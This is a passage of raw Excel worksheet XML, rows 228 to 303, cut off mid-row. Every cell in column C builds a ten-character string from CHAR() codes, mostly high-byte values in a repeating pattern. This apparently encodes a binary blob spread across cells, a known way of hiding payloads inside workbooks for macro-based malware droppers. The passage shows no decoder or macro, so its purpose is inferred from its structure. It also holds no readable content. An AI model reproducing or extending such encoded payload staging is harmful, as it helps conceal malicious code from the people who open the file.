    <row r="228" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C228" t="str">
        <f>CHAR(251)&amp;CHAR(223)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(219)&amp;CHAR(207)</f>
        <v>ûß&gt;±ÖÈ!¥ÛÏ</v>
      </c>
    </row>
    <row r="229" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C229" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(161)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;¡</v>
      </c>
    </row>
    <row r="230" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C230" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="231" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C231" t="str">
        <f>CHAR(33)&amp;CHAR(213)&amp;CHAR(201)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(234)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!ÕÉÏ&gt;êÖÈ!¥</v>
      </c>
    </row>
    <row r="232" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C232" t="str">
        <f>CHAR(155)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(145)&amp;CHAR(213)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>›Ï&gt;‘ÕÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="233" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C233" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="234" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C234" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(123)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(189)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥{Ï&gt;½ÖÈ</v>
      </c>
    </row>
    <row r="235" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C235" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="236" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C236" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="237" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C237" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="238" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C238" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="239" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C239" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="240" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C240" t="str">
        <f>CHAR(219)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(161)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ÛÏ&gt;¡ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="241" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C241" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(181)&amp;CHAR(219)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(249)</f>
        <v>&gt;±ÖÈ!µÛÏ&gt;ù</v>
      </c>
    </row>
    <row r="242" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C242" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="243" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C243" t="str">
        <f>CHAR(33)&amp;CHAR(139)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(70)&amp;CHAR(197)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(127)</f>
        <v>!‹ªFÅÖÈ!</v>
      </c>
    </row>
    <row r="244" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C244" t="str">
        <f>CHAR(233)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(239)&amp;CHAR(207)</f>
        <v>éÏ&gt;±öÈ!¥ïÏ</v>
      </c>
    </row>
    <row r="245" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C245" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(210)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÒÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="246" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C246" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(145)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;‘ÖÈ</v>
      </c>
    </row>
    <row r="247" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C247" t="str">
        <f>CHAR(65)&amp;CHAR(139)&amp;CHAR(136)&amp;CHAR(171)&amp;CHAR(95)&amp;CHAR(197)&amp;CHAR(183)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(193)</f>
        <v>A‹ˆ«_Å·È!Á</v>
      </c>
    </row>
    <row r="248" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C248" t="str">
        <f>CHAR(250)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(150)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(249)&amp;CHAR(207)</f>
        <v>úÏ&gt;±–È!¥ùÏ</v>
      </c>
    </row>
    <row r="249" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C249" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(206)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÎÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="250" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C250" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(241)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;ñÖÈ</v>
      </c>
    </row>
    <row r="251" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C251" t="str">
        <f>CHAR(225)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(188)&amp;CHAR(76)&amp;CHAR(210)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(133)</f>
        <v>á‹‰¼LÒÖÈ!…</v>
      </c>
    </row>
    <row r="252" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C252" t="str">
        <f>CHAR(248)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(182)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(207)</f>
        <v>øÏ&gt;±¶È!¥ÿÏ</v>
      </c>
    </row>
    <row r="253" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C253" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(204)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÌÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="254" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C254" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(241)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;ñÖÈ</v>
      </c>
    </row>
    <row r="255" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C255" t="str">
        <f>CHAR(97)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(222)&amp;CHAR(181)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(169)</f>
        <v>a‹‰ªRÞµÈ!©</v>
      </c>
    </row>
    <row r="256" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C256" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(86)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(249)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±VÈ!¥ùÏ</v>
      </c>
    </row>
    <row r="257" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C257" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(200)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÈÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="258" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C258" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(241)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;ñÖÈ</v>
      </c>
    </row>
    <row r="259" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C259" t="str">
        <f>CHAR(99)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>c¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="260" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C260" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="261" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C261" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="262" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C262" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="263" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C263" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="264" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C264" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="265" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C265" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="266" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C266" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="267" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C267" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="268" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C268" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="269" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C269" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="270" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C270" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="271" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C271" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="272" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C272" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="273" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C273" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="274" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C274" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="275" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C275" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="276" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C276" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="277" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C277" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="278" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C278" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="279" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C279" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="280" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C280" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="281" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C281" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="282" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C282" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="283" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C283" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="284" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C284" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="285" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C285" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="286" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C286" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="287" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C287" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="288" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C288" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="289" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C289" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="290" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C290" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="291" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C291" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="292" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C292" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="293" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C293" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="294" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C294" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="295" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C295" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="296" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C296" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="297" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C297" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="298" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C298" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="299" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C299" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="300" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C300" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="301" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C301" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="302" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C302" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="303" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C303" t="str">
